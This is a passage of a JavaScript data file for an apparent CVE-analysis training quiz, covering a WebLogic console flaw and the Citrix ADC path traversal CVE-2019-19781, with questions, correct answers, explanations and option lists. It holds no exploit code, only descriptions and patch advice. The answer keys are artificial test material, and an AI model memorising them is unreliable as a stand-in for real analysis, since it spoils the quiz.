                options: ["network", "local", "physical", "adjacent"],
                explanation: "Network - WebLogic Server is web-based and the vulnerability is exploited via HTTP requests to the console endpoint."
            },
            mitigation: {
                correct: "patch",
                options: ["patch", "disable_console", "vpn", "encryption"],
                explanation: "Apply Oracle patches. Block access to /console/* paths from untrusted networks. Never expose WebLogic administration console to the internet."
            }
        }
    },
    {
        id: 15,
        cveId: "CVE-2019-19781",
        name: "Citrix ADC Path Traversal",
        published: "December 17, 2019",
        cvssScore: 9.8,
        severity: "Critical",
        category: "network",
        difficulty: "beginner",
        description: "Citrix Application Delivery Controller (ADC) and Gateway allow Directory Traversal. An unauthenticated attacker can exploit this to perform arbitrary code execution.",
        affectedProducts: "Citrix ADC and Gateway 10.5, 11.1, 12.0, 12.1, 13.0",
        vulnType: "path_traversal",
        attackVector: "network",
        correctMitigation: "patch",
        mitigationExplanation: "Apply Citrix patches or upgrade to fixed versions. Implement Citrix's provided mitigation configuration. Monitor for indicators of compromise as this was widely exploited. Consider forensic analysis if exploitation occurred.",
        questions: {
            vulnType: {
                correct: "path_traversal",
                options: ["path_traversal", "sqli", "buffer_overflow", "xss"],
                explanation: "This is a Path Traversal vulnerability that allows writing files to arbitrary locations, leading to code execution. The initial access is via directory traversal."
            },
            attackVector: {
                correct: "network",
                options: ["network", "local", "physical", "adjacent"],
                explanation: "Network - Citrix ADC/Gateway is designed to be internet-facing, making this extremely dangerous as it's directly exploitable from the internet."
            },
            mitigation: {
                correct: "patch",
                options: ["patch", "config_change", "firewall", "antivirus"],
                explanation: "Apply Citrix patches immediately. This vulnerability was massively exploited in the wild. Check for web shells and signs of compromise after patching."
            }
        }
    }
];

// Vulnerability type options for CVE analysis
const vulnTypeOptions = [
    { id: "rce", label: "Remote Code Execution (RCE)" },
    { id: "sqli", label: "SQL Injection" },
    { id: "xss", label: "Cross-Site Scripting (XSS)" },
    { id: "path_traversal", label: "Path Traversal" },
    { id: "privilege_escalation", label: "Privilege Escalation" },
    { id: "info_disclosure", label: "Information Disclosure" },
    { id: "dos", label: "Denial of Service (DoS)" },
    { id: "authentication_bypass", label: "Authentication Bypass" },
    { id: "ssrf", label: "Server-Side Request Forgery" },
    { id: "xxe", label: "XML External Entity (XXE)" },
    { id: "deserialization", label: "Insecure Deserialization" },
    { id: "buffer_overflow", label: "Buffer Overflow" }
];

// Attack vector options
const attackVectorOptions = [
    { id: "network", label: "Network" },
    { id: "adjacent", label: "Adjacent Network" },
    { id: "local", label: "Local" },
    { id: "physical", label: "Physical" }
];

// Mitigation options
const mitigationOptions = [
    { id: "patch", label: "Apply Security Patch" },
    { id: "upgrade", label: "Upgrade Software Version" },
    { id: "firewall", label: "Firewall Rule Changes" },
    { id: "disable_service", label: "Disable Vulnerable Service" },
    { id: "config_change", label: "Configuration Changes" },
    { id: "waf", label: "Web Application Firewall" },
    { id: "network_segmentation", label: "Network Segmentation" },
    { id: "mfa", label: "Multi-Factor Authentication" }
];
